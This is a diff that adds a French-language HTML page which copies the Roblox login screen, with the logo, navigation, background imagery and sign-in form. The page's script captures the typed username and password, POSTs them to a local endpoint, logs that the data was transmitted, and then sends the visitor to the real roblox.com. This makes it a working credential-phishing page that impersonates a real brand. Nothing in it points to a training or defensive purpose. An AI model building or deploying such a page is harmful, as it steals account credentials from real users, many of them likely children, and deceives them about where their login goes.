@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox - Connexion</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Gotham', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background-color: #000000;
+      color: #ffffff;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }
+
+    /* En-tête */
+    header {
+      background-color: #111214;
+      height: 48px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 0 16px;
+      position: fixed;
+      top: 0;
+      width: 100%;
+      z-index: 100;
+      gap: 24px;
+    }
+
+    /* Bloc gauche : Logo + Liens espacés */
+    .nav-left {
+      display: flex;
+      align-items: center;
+      gap: 28px;
+      flex-shrink: 0;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      text-decoration: none;
+    }
+
+    .logo-svg {
+      width: 28px;
+      height: 28px;
+      fill: #ffffff;
+    }
+
+    .nav-link {
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 700;
+      letter-spacing: -0.2px;
+      white-space: nowrap;
+    }
+
+    /* Bloc milieu : Barre de recherche longue */
+    .nav-center {
+      flex: 1;
+      max-width: 600px;
+    }
+
+    .search-container {
+      position: relative;
+      width: 100%;
+      display: flex;
+      align-items: center;
+    }
+
+    .search-icon {
+      position: absolute;
+      left: 12px;
+      width: 16px;
+      height: 16px;
+      fill: #898a8d;
+      pointer-events: none;
+    }
+
+    .search-bar {
+      width: 100%;
+      background-color: #232527;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 6px 12px 6px 36px;
+      color: #ffffff;
+      font-size: 14px;
+      font-weight: 400;
+      outline: none;
+    }
+
+    .search-bar::placeholder {
+      color: #898a8d;
+    }
+
+    /* Bloc droite : Boutons */
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-shrink: 0;
+    }
+
+    .btn-signup {
+      background-color: #3977ff;
+      color: #ffffff;
+      border: none;
+      padding: 6px 14px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .btn-login-nav {
+      background-color: transparent;
+      color: #ffffff;
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      padding: 5px 14px;
+      border-radius: 8px;
+      font-weight: 700;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    /* Zone centrale / Formulaire */
+    .hero-container {
+      margin-top: 48px;
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      position: relative;
+      height: calc(100vh - 48px);
+      overflow: hidden;
+      background-color: #000000;
+    }
+
+    .roblox-bg {
+      position: absolute;
+      top: -30%;
+      left: -30%;
+      width: 160%;
+      height: 160%;
+      background-image: url('https://images.rbxcdn.com/f95713c544d6da21a97e68d0eb5d5a69.jpg');
+      background-size: cover;
+      background-position: center;
+      transform: rotate(-12deg) scale(1.15);
+      opacity: 0.85;
+      z-index: 1;
+    }
+
+    .overlay {
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle, rgba(0, 0, 0, 0.25) 0%, rgba(0, 0, 0, 0.85) 100%);
+      z-index: 2;
+    }
+
+    .login-card {
+      background-color: #232527;
+      width: 100%;
+      max-width: 410px;
+      border-radius: 8px;
+      padding: 32px 28px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.9);
+      z-index: 10;
+      text-align: center;
+    }
+
+    .login-card h1 {
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 20px;
+    }
+
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    .input-field {
+      width: 100%;
+      background-color: #393b3d;
+      border: 1px solid transparent;
+      border-radius: 4px;
+      padding: 10px 12px;
+      color: #ffffff;
+      font-size: 14px;
+      outline: none;
+    }
+
+    .input-field::placeholder {
+      color: #a7a8a9;
+    }
+
+    .btn-submit {
+      width: 100%;
+      background-color: transparent;
+      border: 1px solid #ffffff;
+      color: #ffffff;
+      padding: 8px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 700;
+      margin-top: 4px;
+      cursor: pointer;
+    }
+
+    .forgot-link {
+      display: block;
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 13px;
+      font-weight: 700;
+      margin: 18px 0;
+    }
+
+    .forgot-link:hover {
+      text-decoration: underline;
+    }
+
+    .btn-secondary {
+      width: 100%;
+      background-color: #393b3d;
+      border: none;
+      color: #ffffff;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 8px;
+      cursor: pointer;
+    }
+
+    .signup-text {
+      font-size: 13px;
+      color: #ffffff;
+      margin-top: 20px;
+      font-weight: 500;
+    }
+
+    .signup-text a {
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 700;
+    }
+
+    .signup-text a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="nav-left">
+      <a href="#" class="logo-container">
+        <svg class="logo-svg" viewBox="0 0 100 100">
+          <path d="M 20.3 0 L 100 20.3 L 79.7 100 L 0 79.7 Z M 40.5 38.6 L 38.6 59.5 L 59.5 61.4 L 61.4 40.5 Z"/>
+        </svg>
+      </a>
+      <a href="#" class="nav-link">Charts</a>
+      <a href="#" class="nav-link">Marketplace</a>
+      <a href="#" class="nav-link">Créer</a>
+      <a href="#" class="nav-link">Robux</a>
+    </div>
+
+    <div class="nav-center">
+      <div class="search-container">
+        <svg class="search-icon" viewBox="0 0 24 24">
+          <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+        </svg>
+        <input type="text" class="search-bar" placeholder="Rechercher">
+      </div>
+    </div>
+
+    <div class="nav-right">
+      <button class="btn-signup">S'inscrire</button>
+      <button class="btn-login-nav">Connexion</button>
+    </div>
+  </header>
+
+  <div class="hero-container">
+    <div class="roblox-bg"></div>
+    <div class="overlay"></div>
+
+    <div class="login-card">
+      <h1>Connexion à Roblox</h1>
+      
+      <!-- FORMULAIRE MIS À JOUR AVEC LES IDS -->
+      <form id="loginForm">
+        <div class="form-group">
+          <input type="text" id="username" class="input-field" placeholder="Identifiant/E-mail/Téléphone" required>
+        </div>
+        <div class="form-group">
+          <input type="password" id="password" class="input-field" placeholder="Mot de passe" required>
+        </div>
+        <button type="submit" class="btn-submit">Connexion</button>
+      </form>
+
+      <a href="#" class="forgot-link">Mot de passe ou nom d'utilisateur oublié ?</a>
+
+      <button class="btn-secondary">Envoyez-moi un code unique par email</button>
+      <button class="btn-secondary">Connexion rapide</button>
+
+      <div class="signup-text">
+        Vous n'avez pas de compte ? <a href="#">S'inscrire</a>
+      </div>
+    </div>
+  </div>
+
+  <!-- SCRIPT PLACÉ CORRECTEMENT AVANT LA FIN DU BODY -->
+  <script>
+  const form = document.getElementById('loginForm');
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault(); // Empêche le rechargement de la page
+
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    try {
+      const response = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        console.log('Données transmises !');
+        // Redirection optionnelle après la connexion :
+        window.location.href = 'https://www.roblox.com';
+      }
+    } catch (error) {
+      console.error('Erreur :', error);
+    }
+  });
+  </script>
+
+</body>
+</html>
